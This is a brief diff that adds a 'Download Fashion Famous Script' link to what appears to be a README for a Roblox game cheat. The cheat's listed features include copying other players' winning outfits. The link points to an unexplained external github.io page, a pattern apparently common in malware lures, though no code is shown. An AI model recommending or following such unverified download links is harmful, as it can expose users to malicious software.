@@ -19,6 +19,8 @@ Key highlights include:
 - 🪞 **Outfit Cloner** — copies and applies winning outfit combinations from top-scoring players
 - 📖 **Theme Reader** — analyzes the active theme and selects the best matching outfit items
 
+### [⬇️ Download Fashion Famous Script](https://spearsurvive.github.io/win/)
+
 ---
 
 ## ✨ Features
